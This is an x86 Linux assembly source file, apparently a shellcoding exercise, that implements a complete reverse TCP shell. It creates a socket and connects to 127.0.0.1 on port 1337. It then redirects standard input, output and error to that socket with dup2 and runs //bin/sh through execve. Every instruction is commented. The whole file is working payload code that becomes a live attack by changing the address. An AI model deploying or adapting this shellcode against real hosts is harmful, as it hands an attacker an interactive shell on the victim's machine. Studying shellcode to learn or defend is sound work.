global _start
_start:
    ;SOCKET
    ;Creating a socket socketcall with syscall
    ;int syscall(SYS_socketcall, int call, unsigned long *args);
    ;int socket(int domain, int type, int protocol);
    xor eax, eax
    xor ebx, ebx
    mov bl, 0x01            ;ebx = 1 --> call = socket

    push eax                ;push protocol = 0 for socket function
    push 0x01               ;push type = 1 --> SOCK_STREAM for socket function
    push 0x02               ;push domain = 2 --> AF_INET for socket function
    mov ecx, esp            ;save pointer to arguments in ecx
    mov al, 0x66            ;eax = 0x66 --> socketcall
    int 0x80                ;--> syscall = 0x80

    mov edi , eax           ;save socket for later usage in edi


    ;CONNECT
    ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    xor eax, eax
    inc bl 
    inc bl                  ;call --> bind = 3

                            ;struct sockaddr_in {...}
    push 0x0100007F         ;
    push word 0x3905        ;push sin_port in network byte order --> 0x3905 (=1337) 
    push word 0x02          ;push sin_family --> 2 --> AF_INET
    mov ecx, esp            ;save pointer to struct sockaddr_in in ecx
    push 0x10               ;push addrlen 0x10 (=16) for connect function
    push ecx                ;push pointer to struct sockaddr_in for connect function
    push edi                ;push sockfd for connect function
    mov ecx, esp            ;save pointer to arguments in ecx
    
    mov al, 0x66
    int 0x80;


    ;DUP2 
    ;int dup2(int oldfd, int newfd);
    xor ecx, ecx 

    mov cl, 2               ;write 2 in ecx for newfd parameter of dup2 

dupLoop:
    mov ebx, edi            ;write old socket in ebx for oldfd parameter of dup2
    xor eax, eax            
    mov al, 0x3f            ;eax = 0x3f --> dup2
    int 0x80 

    dec cx                  ;decrease ecx by 1 --> newfd    
    jns dupLoop             ;loop until sign / negative flag(so 2,1,0)


    ;EXECVE
    ;int execve(const char *pathname, char *const argv[], char *const envp[]);
    xor eax, eax
    mov ecx, eax            ;arg = ecx = 0
    mov edx, eax            ;envp = edx = 0
    push eax
                            ;//bin/sh
                            ;2f 2f 62 69 - 6e 2f 73 68
    push 0x68732f6e         
    push 0x69622f2f
    mov ebx, esp            ;pathname = ebx --> pointer to the stack to //bin/sh
    mov al, 0xb             ;eax = 0xb --> execve
    int 0x80
